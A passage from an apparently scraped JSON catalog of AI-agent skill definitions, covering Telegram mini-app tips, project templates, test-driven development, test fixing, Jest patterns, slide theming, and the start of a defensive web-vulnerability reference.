{\n  const { tg, user } = useTelegram();\n  const referralLink = `https://t.me/your_bot?start=ref_${user.id}`;\n\n  const share = () => {\n    tg.openTelegramLink(\n      `https://t.me/share/url?url=${encodeURIComponent(referralLink)}&text=Check this out!`\n    );\n  };\n\n  return <button onClick={share}>Invite Friends (+10 coins)</button>;\n}\n```\n\n### Gamification for Retention\n- Daily rewards\n- Streak bonuses\n- Leaderboards\n- Achievement badges\n- Referral bonuses\n```\n\n## Anti-Patterns\n\n### ❌ Ignoring Telegram Theme\n\n**Why bad**: Feels foreign in Telegram.\nBad user experience.\nJarring transitions.\nUsers don't trust it.\n\n**Instead**: Use tg.themeParams.\nMatch Telegram colors.\nUse native-feeling UI.\nTest in both light/dark.\n\n### ❌ Desktop-First Mini App\n\n**Why bad**: 95% of Telegram is mobile.\nTouch targets too small.\nDoesn't fit in Telegram UI.\nScrolling issues.\n\n**Instead**: Mobile-first always.\nTest on real phones.\nTouc",
      "tags": [
        "python",
        "javascript",
        "react",
        "api",
        "ai",
        "design",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:22:08.685Z"
    },
    {
      "id": "antigravity-app-builder-templates",
      "name": "templates",
      "slug": "app-builder-templates",
      "description": "Project scaffolding templates for new applications. Use when creating new projects from scratch. Contains 12 templates for various tech stacks.",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/app-builder/templates",
      "content": "\n# Project Templates\n\n> Quick-start templates for scaffolding new projects.\n\n---\n\n## 🎯 Selective Reading Rule\n\n**Read ONLY the template matching user's project type!**\n\n| Template | Tech Stack | When to Use |\n|----------|------------|-------------|\n| [nextjs-fullstack](nextjs-fullstack/TEMPLATE.md) | Next.js + Prisma | Full-stack web app |\n| [nextjs-saas](nextjs-saas/TEMPLATE.md) | Next.js + Stripe | SaaS product |\n| [nextjs-static](nextjs-static/TEMPLATE.md) | Next.js + Framer | Landing page |\n| [express-api](express-api/TEMPLATE.md) | Express + JWT | REST API |\n| [python-fastapi](python-fastapi/TEMPLATE.md) | FastAPI | Python API |\n| [react-native-app](react-native-app/TEMPLATE.md) | Expo + Zustand | Mobile app |\n| [flutter-app](flutter-app/TEMPLATE.md) | Flutter + Riverpod | Cross-platform |\n| [electron-desktop](electron-desktop/TEMPLATE.md) | Electron + React | Desktop app |\n| [chrome-extension](chrome-extension/TEMPLATE.md) | Chrome MV3 | Browser extension |\n| [cli-tool](cli-tool/TEMPLATE.md) | Node.js + Commander | CLI app |\n| [monorepo-turborepo](monorepo-turborepo/TEMPLATE.md) | Turborepo + pnpm | Monorepo |\n| [astro-static](astro-static/TEMPLATE.md) | Astro + MDX | Blog / Docs |\n\n---\n\n## Usage\n\n1. User says \"create [type] app\"\n2. Match to appropriate template\n3. Read ONLY that template's TEMPLATE.md\n4. Follow its tech stack and structure\n",
      "tags": [
        "python",
        "react",
        "node",
        "nextjs",
        "api",
        "ai",
        "template",
        "prisma",
        "stripe",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:41.969Z"
    },
    {
      "id": "superpowers-test-driven-development",
      "name": "test-driven-development",
      "slug": "superpowers-test-driven-development",
      "description": "Use when implementing any feature or bugfix, before writing implementation code",
      "category": "Development & Code Tools",
      "source": "superpowers",
      "repoUrl": "https://github.com/obra/superpowers",
      "skillUrl": "https://github.com/obra/superpowers/tree/main/skills/test-driven-development",
      "content": "\n# Test-Driven Development (TDD)\n\n## Overview\n\nWrite the test first. Watch it fail. Write minimal code to pass.\n\n**Core principle:** If you didn't watch the test fail, you don't know if it tests the right thing.\n\n**Violating the letter of the rules is violating the spirit of the rules.**\n\n## When to Use\n\n**Always:**\n- New features\n- Bug fixes\n- Refactoring\n- Behavior changes\n\n**Exceptions (ask your human partner):**\n- Throwaway prototypes\n- Generated code\n- Configuration files\n\nThinking \"skip TDD just this once\"? Stop. That's rationalization.\n\n## The Iron Law\n\n```\nNO PRODUCTION CODE WITHOUT A FAILING TEST FIRST\n```\n\nWrite code before the test? Delete it. Start over.\n\n**No exceptions:**\n- Don't keep it as \"reference\"\n- Don't \"adapt\" it while writing tests\n- Don't look at it\n- Delete means delete\n\nImplement fresh from tests. Period.\n\n## Red-Green-Refactor\n\n```dot\ndigraph tdd_cycle {\n    rankdir=LR;\n    red [label=\"RED\\nWrite failing test\", shape=box, style=filled, fillcolor=\"#ffcccc\"];\n    verify_red [label=\"Verify fails\\ncorrectly\", shape=diamond];\n    green [label=\"GREEN\\nMinimal code\", shape=box, style=filled, fillcolor=\"#ccffcc\"];\n    verify_green [label=\"Verify passes\\nAll green\", shape=diamond];\n    refactor [label=\"REFACTOR\\nClean up\", shape=box, style=filled, fillcolor=\"#ccccff\"];\n    next [label=\"Next\", shape=ellipse];\n\n    red -> verify_red;\n    verify_red -> green [label=\"yes\"];\n    verify_red -> red [label=\"wrong\\nfailure\"];\n    green -> verify_green;\n    verify_green -> refactor [label=\"yes\"];\n    verify_green -> green [label=\"no\"];\n    refactor -> verify_green [label=\"stay\\ngreen\"];\n    verify_green -> next;\n    next -> red;\n}\n```\n\n### RED - Write Failing Test\n\nWrite one minimal test showing what should happen.\n\n<Good>\n```typescript\ntest('retries failed operations 3 times', async () => {\n  let attempts = 0;\n  const operation = () => {\n    attempts++;\n    if (attempts < 3) throw new Error('fail');\n    return 'success';\n  };\n\n  const result = await retryOperation(operation);\n\n  expect(result).toBe('success');\n  expect(attempts).toBe(3);\n});\n```\nClear name, tests real behavior, one thing\n</Good>\n\n<Bad>\n```typescript\ntest('retry works', async () => {\n  const mock = jest.fn()\n    .mockRejectedValueOnce(new Error())\n    .mockRejectedValueOnce(new Error())\n    .mockResolvedValueOnce('success');\n  await retryOperation(mock);\n  expect(mock).toHaveBeenCalledTimes(3);\n});\n```\nVague name, tests mock not code\n</Bad>\n\n**Requirements:**\n- One behavior\n- Clear name\n- Real code (no mocks unless unavoidable)\n\n### Verify RED - Watch It Fail\n\n**MANDATORY. Never skip.**\n\n```bash\nnpm test path/to/test.test.ts\n```\n\nConfirm:\n- Test fails (not errors)\n- Failure message is expected\n- Fails because feature missing (not typos)\n\n**Test passes?** You're testing existing behavior. Fix test.\n\n**Test errors?** Fix error, re-run until it fails correctly.\n\n### GREEN - Minimal Code\n\nWrite simplest code to pass the test.\n\n<Good>\n```typescript\nasync function retryOperation<T>(fn: () => Promise<T>): Promise<T> {\n  for (let i = 0; i < 3; i++) {\n    try {\n      return await fn();\n    } catch (e) {\n      if (i === 2) throw e;\n    }\n  }\n  throw new Error('unreachable');\n}\n```\nJust enough to pass\n</Good>\n\n<Bad>\n```typescript\nasync function retryOperation<T>(\n  fn: () => Promise<T>,\n  options?: {\n    maxRetries?: number;\n    backoff?: 'linear' | 'exponential';\n    onRetry?: (attempt: number) => void;\n  }\n): Promise<T> {\n  // YAGNI\n}\n```\nOver-engineered\n</Bad>\n\nDon't add features, refactor other code, or \"improve\" beyond the test.\n\n### Verify GREEN - Watch It Pass\n\n**MANDATORY.**\n\n```bash\nnpm test path/to/test.test.ts\n```\n\nConfirm:\n- Test passes\n- Other tests still pass\n- Output pristine (no errors, warnings)\n\n**Test fails?** Fix code, not test.\n\n**Other tests fail?** Fix now.\n\n### REFACTOR - Clean Up\n\nAfter green only:\n- Remove duplication\n- Improve names\n- Extract helpers\n\nKeep tests green. Don't add behavior.\n\n### Repeat\n\nNext failing test for next feature.\n\n## Good Tests\n\n| Quality | Good | Bad |\n|---------|------|-----|\n| **Minimal** | One thing. \"and\" in name? Split it. | `test('validates email and domain and whitespace')` |\n| **Clear** | Name describes behavior | `test('test1')` |\n| **Shows intent** | Demonstrates desired API | Obscures what code should do |\n\n## Why Order Matters\n\n**\"I'll write tests after to verify it works\"**\n\nTests written after code pass immediately. Passing immediately proves nothing:\n- Might test wrong thing\n- Might test implementation, not behavior\n- Might miss edge cases you forgot\n- You never saw it catch the bug\n\nTest-first forces you to see the test fail, proving it actually tests something.\n\n**\"I already manually tested all the edge cases\"**\n\nManual testing is ad-hoc. You think you tested everything but:\n- No record of what you tested\n- Can't re-run when code changes\n- Easy to forget cases under pressure\n- \"It worked when I tried it\" ≠ comprehensive\n\nAutomated tests are systematic. They run the same way e",
      "tags": [
        "tdd",
        "testing",
        "debug",
        "debugging",
        "verification",
        "red-green-refactor",
        "systematic",
        "test",
        "driven",
        "development"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:14:20.509Z"
    },
    {
      "id": "antigravity-test-driven-development",
      "name": "test-driven-development",
      "slug": "test-driven-development",
      "description": "Use when implementing any feature or bugfix, before writing implementation code",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/test-driven-development",
      "content": "\n# Test-Driven Development (TDD)\n\n## Overview\n\nWrite the test first. Watch it fail. Write minimal code to pass.\n\n**Core principle:** If you didn't watch the test fail, you don't know if it tests the right thing.\n\n**Violating the letter of the rules is violating the spirit of the rules.**\n\n## When to Use\n\n**Always:**\n- New features\n- Bug fixes\n- Refactoring\n- Behavior changes\n\n**Exceptions (ask your human partner):**\n- Throwaway prototypes\n- Generated code\n- Configuration files\n\nThinking \"skip TDD just this once\"? Stop. That's rationalization.\n\n## The Iron Law\n\n```\nNO PRODUCTION CODE WITHOUT A FAILING TEST FIRST\n```\n\nWrite code before the test? Delete it. Start over.\n\n**No exceptions:**\n- Don't keep it as \"reference\"\n- Don't \"adapt\" it while writing tests\n- Don't look at it\n- Delete means delete\n\nImplement fresh from tests. Period.\n\n## Red-Green-Refactor\n\n```dot\ndigraph tdd_cycle {\n    rankdir=LR;\n    red [label=\"RED\\nWrite failing test\", shape=box, style=filled, fillcolor=\"#ffcccc\"];\n    verify_red [label=\"Verify fails\\ncorrectly\", shape=diamond];\n    green [label=\"GREEN\\nMinimal code\", shape=box, style=filled, fillcolor=\"#ccffcc\"];\n    verify_green [label=\"Verify passes\\nAll green\", shape=diamond];\n    refactor [label=\"REFACTOR\\nClean up\", shape=box, style=filled, fillcolor=\"#ccccff\"];\n    next [label=\"Next\", shape=ellipse];\n\n    red -> verify_red;\n    verify_red -> green [label=\"yes\"];\n    verify_red -> red [label=\"wrong\\nfailure\"];\n    green -> verify_green;\n    verify_green -> refactor [label=\"yes\"];\n    verify_green -> green [label=\"no\"];\n    refactor -> verify_green [label=\"stay\\ngreen\"];\n    verify_green -> next;\n    next -> red;\n}\n```\n\n### RED - Write Failing Test\n\nWrite one minimal test showing what should happen.\n\n<Good>\n```typescript\ntest('retries failed operations 3 times', async () => {\n  let attempts = 0;\n  const operation = () => {\n    attempts++;\n    if (attempts < 3) throw new Error('fail');\n    return 'success';\n  };\n\n  const result = await retryOperation(operation);\n\n  expect(result).toBe('success');\n  expect(attempts).toBe(3);\n});\n```\nClear name, tests real behavior, one thing\n</Good>\n\n<Bad>\n```typescript\ntest('retry works', async () => {\n  const mock = jest.fn()\n    .mockRejectedValueOnce(new Error())\n    .mockRejectedValueOnce(new Error())\n    .mockResolvedValueOnce('success');\n  await retryOperation(mock);\n  expect(mock).toHaveBeenCalledTimes(3);\n});\n```\nVague name, tests mock not code\n</Bad>\n\n**Requirements:**\n- One behavior\n- Clear name\n- Real code (no mocks unless unavoidable)\n\n### Verify RED - Watch It Fail\n\n**MANDATORY. Never skip.**\n\n```bash\nnpm test path/to/test.test.ts\n```\n\nConfirm:\n- Test fails (not errors)\n- Failure message is expected\n- Fails because feature missing (not typos)\n\n**Test passes?** You're testing existing behavior. Fix test.\n\n**Test errors?** Fix error, re-run until it fails correctly.\n\n### GREEN - Minimal Code\n\nWrite simplest code to pass the test.\n\n<Good>\n```typescript\nasync function retryOperation<T>(fn: () => Promise<T>): Promise<T> {\n  for (let i = 0; i < 3; i++) {\n    try {\n      return await fn();\n    } catch (e) {\n      if (i === 2) throw e;\n    }\n  }\n  throw new Error('unreachable');\n}\n```\nJust enough to pass\n</Good>\n\n<Bad>\n```typescript\nasync function retryOperation<T>(\n  fn: () => Promise<T>,\n  options?: {\n    maxRetries?: number;\n    backoff?: 'linear' | 'exponential';\n    onRetry?: (attempt: number) => void;\n  }\n): Promise<T> {\n  // YAGNI\n}\n```\nOver-engineered\n</Bad>\n\nDon't add features, refactor other code, or \"improve\" beyond the test.\n\n### Verify GREEN - Watch It Pass\n\n**MANDATORY.**\n\n```bash\nnpm test path/to/test.test.ts\n```\n\nConfirm:\n- Test passes\n- Other tests still pass\n- Output pristine (no errors, warnings)\n\n**Test fails?** Fix code, not test.\n\n**Other tests fail?** Fix now.\n\n### REFACTOR - Clean Up\n\nAfter green only:\n- Remove duplication\n- Improve names\n- Extract helpers\n\nKeep tests green. Don't add behavior.\n\n### Repeat\n\nNext failing test for next feature.\n\n## Good Tests\n\n| Quality | Good | Bad |\n|---------|------|-----|\n| **Minimal** | One thing. \"and\" in name? Split it. | `test('validates email and domain and whitespace')` |\n| **Clear** | Name describes behavior | `test('test1')` |\n| **Shows intent** | Demonstrates desired API | Obscures what code should do |\n\n## Why Order Matters\n\n**\"I'll write tests after to verify it works\"**\n\nTests written after code pass immediately. Passing immediately proves nothing:\n- Might test wrong thing\n- Might test implementation, not behavior\n- Might miss edge cases you forgot\n- You never saw it catch the bug\n\nTest-first forces you to see the test fail, proving it actually tests something.\n\n**\"I already manually tested all the edge cases\"**\n\nManual testing is ad-hoc. You think you tested everything but:\n- No record of what you tested\n- Can't re-run when code changes\n- Easy to forget cases under pressure\n- \"It worked when I tried it\" ≠ comprehensive\n\nAutomated tests are systematic. They run the same way e",
      "tags": [
        "typescript",
        "api",
        "ai",
        "design",
        "document",
        "rag"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:22:10.267Z"
    },
    {
      "id": "antigravity-test-fixing",
      "name": "test-fixing",
      "slug": "test-fixing",
      "description": "Run tests and systematically fix all failing tests using smart error grouping. Use when user asks to fix failing tests, mentions test failures, runs test suite and failures occur, or requests to make tests pass.",
      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/test-fixing",
      "content": "\n# Test Fixing\n\nSystematically identify and fix all failing tests using smart grouping strategies.\n\n## When to Use\n\n- Explicitly asks to fix tests (\"fix these tests\", \"make tests pass\")\n- Reports test failures (\"tests are failing\", \"test suite is broken\")\n- Completes implementation and wants tests passing\n- Mentions CI/CD failures due to tests\n\n## Systematic Approach\n\n### 1. Initial Test Run\n\nRun `make test` to identify all failing tests.\n\nAnalyze output for:\n\n- Total number of failures\n- Error types and patterns\n- Affected modules/files\n\n### 2. Smart Error Grouping\n\nGroup similar failures by:\n\n- **Error type**: ImportError, AttributeError, AssertionError, etc.\n- **Module/file**: Same file causing multiple test failure\n- **Root cause**: Missing dependencies, API changes, refactoring impacts\n\nPrioritize groups by:\n\n- Number of affected tests (highest impact first)\n- Dependency order (fix infrastructure before functionality)\n\n### 3. Systematic Fixing Process\n\nFor each group (starting with highest impact):\n\n1. **Identify root cause**\n\n   - Read relevant code\n   - Check recent changes with `git diff`\n   - Understand the error pattern\n\n2. **Implement fix**\n\n   - Use Edit tool for code changes\n   - Follow project conventions (see CLAUDE.md)\n   - Make minimal, focused changes\n\n3. **Verify fix**\n\n   - Run subset of tests for this group\n   - Use pytest markers or file patterns:\n     ```bash\n     uv run pytest tests/path/to/test_file.py -v\n     uv run pytest -k \"pattern\" -v\n     ```\n   - Ensure group passes before moving on\n\n4. **Move to next group**\n\n### 4. Fix Order Strategy\n\n**Infrastructure first:**\n\n- Import errors\n- Missing dependencies\n- Configuration issues\n\n**Then API changes:**\n\n- Function signature changes\n- Module reorganization\n- Renamed variables/functions\n\n**Finally, logic issues:**\n\n- Assertion failures\n- Business logic bugs\n- Edge case handling\n\n### 5. Final Verification\n\nAfter all groups fixed:\n\n- Run complete test suite: `make test`\n- Verify no regressions\n- Check test coverage remains intact\n\n## Best Practices\n\n- Fix one group at a time\n- Run focused tests after each fix\n- Use `git diff` to understand recent changes\n- Look for patterns in failures\n- Don't move to next group until current passes\n- Keep changes minimal and focused\n\n## Example Workflow\n\nUser: \"The tests are failing after my refactor\"\n\n1. Run `make test` → 15 failures identified\n2. Group errors:\n   - 8 ImportErrors (module renamed)\n   - 5 AttributeErrors (function signature changed)\n   - 2 AssertionErrors (logic bugs)\n3. Fix ImportErrors first → Run subset → Verify\n4. Fix AttributeErrors → Run subset → Verify\n5. Fix AssertionErrors → Run subset → Verify\n6. Run full suite → All pass ✓\n",
      "tags": [
        "api",
        "claude",
        "ai",
        "workflow",
        "rag"
      ],
      "useCases": [
        "Explicitly asks to fix tests (\"fix these tests\", \"make tests pass\")",
        "Reports test failures (\"tests are failing\", \"test suite is broken\")",
        "Completes implementation and wants tests passing",
        "Mentions CI/CD failures due to tests"
      ],
      "scrapedAt": "2026-01-26T13:22:11.486Z"
    },
    {
      "id": "antigravity-testing-patterns",
      "name": "testing-patterns",
      "slug": "testing-patterns",
      "description": "Jest testing patterns, factory functions, mocking strategies, and TDD workflow. Use when writing unit tests, creating test factories, or following TDD red-green-refactor cycle.",
      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/testing-patterns",
      "content": "\n# Testing Patterns and Utilities\n\n## Testing Philosophy\n\n**Test-Driven Development (TDD):**\n- Write failing test FIRST\n- Implement minimal code to pass\n- Refactor after green\n- Never write production code without a failing test\n\n**Behavior-Driven Testing:**\n- Test behavior, not implementation\n- Focus on public APIs and business requirements\n- Avoid testing implementation details\n- Use descriptive test names that describe behavior\n\n**Factory Pattern:**\n- Create `getMockX(overrides?: Partial<X>)` functions\n- Provide sensible defaults\n- Allow overriding specific properties\n- Keep tests DRY and maintainable\n\n## Test Utilities\n\n### Custom Render Function\n\nCreate a custom render that wraps components with required providers:\n\n```typescript\n// src/utils/testUtils.tsx\nimport { render } from '@testing-library/react-native';\nimport { ThemeProvider } from './theme';\n\nexport const renderWithTheme = (ui: React.ReactElement) => {\n  return render(\n    <ThemeProvider>{ui}</ThemeProvider>\n  );\n};\n```\n\n**Usage:**\n```typescript\nimport { renderWithTheme } from 'utils/testUtils';\nimport { screen } from '@testing-library/react-native';\n\nit('should render component', () => {\n  renderWithTheme(<MyComponent />);\n  expect(screen.getByText('Hello')).toBeTruthy();\n});\n```\n\n## Factory Pattern\n\n### Component Props Factory\n\n```typescript\nimport { ComponentProps } from 'react';\n\nconst getMockMyComponentProps = (\n  overrides?: Partial<ComponentProps<typeof MyComponent>>\n) => {\n  return {\n    title: 'Default Title',\n    count: 0,\n    onPress: jest.fn(),\n    isLoading: false,\n    ...overrides,\n  };\n};\n\n// Usage in tests\nit('should render with custom title', () => {\n  const props = getMockMyComponentProps({ title: 'Custom Title' });\n  renderWithTheme(<MyComponent {...props} />);\n  expect(screen.getByText('Custom Title')).toBeTruthy();\n});\n```\n\n### Data Factory\n\n```typescript\ninterface User {\n  id: string;\n  name: string;\n  email: string;\n  role: 'admin' | 'user';\n}\n\nconst getMockUser = (overrides?: Partial<User>): User => {\n  return {\n    id: '123',\n    name: 'John Doe',\n    email: 'john@example.com',\n    role: 'user',\n    ...overrides,\n  };\n};\n\n// Usage\nit('should display admin badge for admin users', () => {\n  const user = getMockUser({ role: 'admin' });\n  renderWithTheme(<UserCard user={user} />);\n  expect(screen.getByText('Admin')).toBeTruthy();\n});\n```\n\n## Mocking Patterns\n\n### Mocking Modules\n\n```typescript\n// Mock entire module\njest.mock('utils/analytics');\n\n// Mock with factory function\njest.mock('utils/analytics', () => ({\n  Analytics: {\n    logEvent: jest.fn(),\n  },\n}));\n\n// Access mock in test\nconst mockLogEvent = jest.requireMock('utils/analytics').Analytics.logEvent;\n```\n\n### Mocking GraphQL Hooks\n\n```typescript\njest.mock('./GetItems.generated', () => ({\n  useGetItemsQuery: jest.fn(),\n}));\n\nconst mockUseGetItemsQuery = jest.requireMock(\n  './GetItems.generated'\n).useGetItemsQuery as jest.Mock;\n\n// In test\nmockUseGetItemsQuery.mockReturnValue({\n  data: { items: [] },\n  loading: false,\n  error: undefined,\n});\n```\n\n## Test Structure\n\n```typescript\ndescribe('ComponentName', () => {\n  beforeEach(() => {\n    jest.clearAllMocks();\n  });\n\n  describe('Rendering', () => {\n    it('should render component with default props', () => {});\n    it('should render loading state when loading', () => {});\n  });\n\n  describe('User interactions', () => {\n    it('should call onPress when button is clicked', async () => {});\n  });\n\n  describe('Edge cases', () => {\n    it('should handle empty data gracefully', () => {});\n  });\n});\n```\n\n## Query Patterns\n\n```typescript\n// Element must exist\nexpect(screen.getByText('Hello')).toBeTruthy();\n\n// Element should not exist\nexpect(screen.queryByText('Goodbye')).toBeNull();\n\n// Element appears asynchronously\nawait waitFor(() => {\n  expect(screen.findByText('Loaded')).toBeTruthy();\n});\n```\n\n## User Interaction Patterns\n\n```typescript\nimport { fireEvent, screen } from '@testing-library/react-native';\n\nit('should submit form on button click', async () => {\n  const onSubmit = jest.fn();\n  renderWithTheme(<LoginForm onSubmit={onSubmit} />);\n\n  fireEvent.changeText(screen.getByLabelText('Email'), 'user@example.com');\n  fireEvent.changeText(screen.getByLabelText('Password'), 'password123');\n  fireEvent.press(screen.getByTestId('login-button'));\n\n  await waitFor(() => {\n    expect(onSubmit).toHaveBeenCalled();\n  });\n});\n```\n\n## Anti-Patterns to Avoid\n\n### Testing Mock Behavior Instead of Real Behavior\n\n```typescript\n// Bad - testing the mock\nexpect(mockFetchData).toHaveBeenCalled();\n\n// Good - testing actual behavior\nexpect(screen.getByText('John Doe')).toBeTruthy();\n```\n\n### Not Using Factories\n\n```typescript\n// Bad - duplicated, inconsistent test data\nit('test 1', () => {\n  const user = { id: '1', name: 'John', email: 'john@test.com', role: 'user' };\n});\nit('test 2', () => {\n  const user = { id: '2', name: 'Jane', email: 'jane@test.com' }; // Missing role!\n});\n\n// Good - reusable factory\nconst user = getMockUser({ name:",
      "tags": [
        "typescript",
        "react",
        "api",
        "ai",
        "llm",
        "workflow",
        "rag"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:22:12.784Z"
    },
    {
      "id": "anthropic-theme-factory",
      "name": "theme-factory",
      "slug": "theme-factory",
      "description": "Toolkit for styling artifacts with a theme. These artifacts can be slides, docs, reportings, HTML landing pages, etc. There are 10 pre-set themes with colors/fonts that you can apply to any artifact that has been creating, or can generate a new theme on-the-fly.",
      "category": "Creative & Media",
      "source": "anthropic",
      "repoUrl": "https://github.com/anthropics/skills",
      "skillUrl": "https://github.com/anthropics/skills/tree/main/skills/theme-factory",
      "content": "\n\n# Theme Factory Skill\n\nThis skill provides a curated collection of professional font and color themes themes, each with carefully selected color palettes and font pairings. Once a theme is chosen, it can be applied to any artifact.\n\n## Purpose\n\nTo apply consistent, professional styling to presentation slide decks, use this skill. Each theme includes:\n- A cohesive color palette with hex codes\n- Complementary font pairings for headers and body text\n- A distinct visual identity suitable for different contexts and audiences\n\n## Usage Instructions\n\nTo apply styling to a slide deck or other artifact:\n\n1. **Show the theme showcase**: Display the `theme-showcase.pdf` file to allow users to see all available themes visually. Do not make any modifications to it; simply show the file for viewing.\n2. **Ask for their choice**: Ask which theme to apply to the deck\n3. **Wait for selection**: Get explicit confirmation about the chosen theme\n4. **Apply the theme**: Once a theme has been chosen, apply the selected theme's colors and fonts to the deck/artifact\n\n## Themes Available\n\nThe following 10 themes are available, each showcased in `theme-showcase.pdf`:\n\n1. **Ocean Depths** - Professional and calming maritime theme\n2. **Sunset Boulevard** - Warm and vibrant sunset colors\n3. **Forest Canopy** - Natural and grounded earth tones\n4. **Modern Minimalist** - Clean and contemporary grayscale\n5. **Golden Hour** - Rich and warm autumnal palette\n6. **Arctic Frost** - Cool and crisp winter-inspired theme\n7. **Desert Rose** - Soft and sophisticated dusty tones\n8. **Tech Innovation** - Bold and modern tech aesthetic\n9. **Botanical Garden** - Fresh and organic garden colors\n10. **Midnight Galaxy** - Dramatic and cosmic deep tones\n\n## Theme Details\n\nEach theme is defined in the `themes/` directory with complete specifications including:\n- Cohesive color palette with hex codes\n- Complementary font pairings for headers and body text\n- Distinct visual identity suitable for different contexts and audiences\n\n## Application Process\n\nAfter a preferred theme is selected:\n1. Read the corresponding theme file from the `themes/` directory\n2. Apply the specified colors and fonts consistently throughout the deck\n3. Ensure proper contrast and readability\n4. Maintain the theme's visual identity across all slides\n\n## Create your Own Theme\nTo handle cases where none of the existing themes work for an artifact, create a custom theme. Based on provided inputs, generate a new theme similar to the ones above. Give the theme a similar name describing what the font/color combinations represent. Use any basic description provided to choose appropriate colors/fonts. After generating the theme, show it for review and verification. Following that, apply the theme as described above.\n",
      "tags": [
        "pdf",
        "ai",
        "presentation"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:14:43.860Z"
    },
    {
      "id": "awesome-llm-theme-factory",
      "name": "theme-factory",
      "slug": "awesome-llm-theme-factory",
      "description": "Toolkit for styling artifacts with a theme. These artifacts can be slides, docs, reportings, HTML landing pages, etc. There are 10 pre-set themes with colors/fonts that you can apply to any artifact that has been creating, or can generate a new theme on-the-fly.",
      "category": "Creative & Media",
      "source": "awesome-llm",
      "repoUrl": "https://github.com/Prat011/awesome-llm-skills",
      "skillUrl": "https://github.com/Prat011/awesome-llm-skills/tree/master/theme-factory",
      "content": "\n\n# Theme Factory Skill\n\nThis skill provides a curated collection of professional font and color themes themes, each with carefully selected color palettes and font pairings. Once a theme is chosen, it can be applied to any artifact.\n\n## Purpose\n\nTo apply consistent, professional styling to presentation slide decks, use this skill. Each theme includes:\n- A cohesive color palette with hex codes\n- Complementary font pairings for headers and body text\n- A distinct visual identity suitable for different contexts and audiences\n\n## Usage Instructions\n\nTo apply styling to a slide deck or other artifact:\n\n1. **Show the theme showcase**: Display the `theme-showcase.pdf` file to allow users to see all available themes visually. Do not make any modifications to it; simply show the file for viewing.\n2. **Ask for their choice**: Ask which theme to apply to the deck\n3. **Wait for selection**: Get explicit confirmation about the chosen theme\n4. **Apply the theme**: Once a theme has been chosen, apply the selected theme's colors and fonts to the deck/artifact\n\n## Themes Available\n\nThe following 10 themes are available, each showcased in `theme-showcase.pdf`:\n\n1. **Ocean Depths** - Professional and calming maritime theme\n2. **Sunset Boulevard** - Warm and vibrant sunset colors\n3. **Forest Canopy** - Natural and grounded earth tones\n4. **Modern Minimalist** - Clean and contemporary grayscale\n5. **Golden Hour** - Rich and warm autumnal palette\n6. **Arctic Frost** - Cool and crisp winter-inspired theme\n7. **Desert Rose** - Soft and sophisticated dusty tones\n8. **Tech Innovation** - Bold and modern tech aesthetic\n9. **Botanical Garden** - Fresh and organic garden colors\n10. **Midnight Galaxy** - Dramatic and cosmic deep tones\n\n## Theme Details\n\nEach theme is defined in the `themes/` directory with complete specifications including:\n- Cohesive color palette with hex codes\n- Complementary font pairings for headers and body text\n- Distinct visual identity suitable for different contexts and audiences\n\n## Application Process\n\nAfter a preferred theme is selected:\n1. Read the corresponding theme file from the `themes/` directory\n2. Apply the specified colors and fonts consistently throughout the deck\n3. Ensure proper contrast and readability\n4. Maintain the theme's visual identity across all slides\n\n## Create your Own Theme\nTo handle cases where none of the existing themes work for an artifact, create a custom theme. Based on provided inputs, generate a new theme similar to the ones above. Give the theme a similar name describing what the font/color combinations represent. Use any basic description provided to choose appropriate colors/fonts. After generating the theme, show it for review and verification. Following that, apply the theme as described above.\n",
      "tags": [
        "pdf",
        "ai",
        "theme",
        "factory"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:06.318Z"
    },
    {
      "id": "antigravity-top-web-vulnerabilities",
      "name": "Top 100 Web Vulnerabilities Reference",
      "slug": "top-web-vulnerabilities",
      "description": "This skill should be used when the user asks to \"identify web application vulnerabilities\", \"explain common security flaws\", \"understand vulnerability categories\", \"learn about injection attacks\", \"review access control weaknesses\", \"analyze API security issues\", \"assess security misconfigurations\",",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/top-web-vulnerabilities",
      "content": "\n# Top 100 Web Vulnerabilities Reference\n\n## Purpose\n\nProvide a comprehensive, structured reference for the 100 most critical web application vulnerabilities organized by category. This skill enables systematic vulnerability identification, impact assessment, and remediation guidance across the full spectrum of web security threats. Content organized into 15 major vulnerability categories aligned with industry standards and real-world attack patterns.\n\n## Prerequisites\n\n- Basic understanding of web application architecture (client-server model, HTTP protocol)\n- Familiarity with common web technologies (HTML, JavaScript, SQL, XML, APIs)\n- Understanding of authentication and authorization concepts\n- Access to web application security testing tools (Burp Suite, OWASP ZAP)\n- Knowledge of secure coding principles recommended\n\n## Outputs and Deliverables\n\n- Complete vulnerability catalog with definitions, root causes, impacts, and mitigations\n- Category-based vulnerability groupings for systematic assessment\n- Quick reference for security testing and remediation\n- Foundation for vulnerability assessment checklists and security policies\n\n---\n\n## Core Workflow\n\n### Phase 1: Injection Vulnerabilities Assessment\n\nEvaluate injection attack vectors targeting data processing components:\n\n**SQL Injection (1)**\n- Definition: Malicious SQL code inserted into input fields to manipulate database queries\n- Root Cause: Lack of input validation, improper use of parameterized queries\n- Impact: Unauthorized data access, data manipulation, database compromise\n- Mitigation: Use parameterized queries/prepared statements, input validation, least privilege database accounts\n\n**Cross-Site Scripting - XSS (2)**\n- Definition: Injection of malicious scripts into web pages viewed by other users\n- Root Cause: Insufficient output encoding, lack of input sanitization\n- Impact: 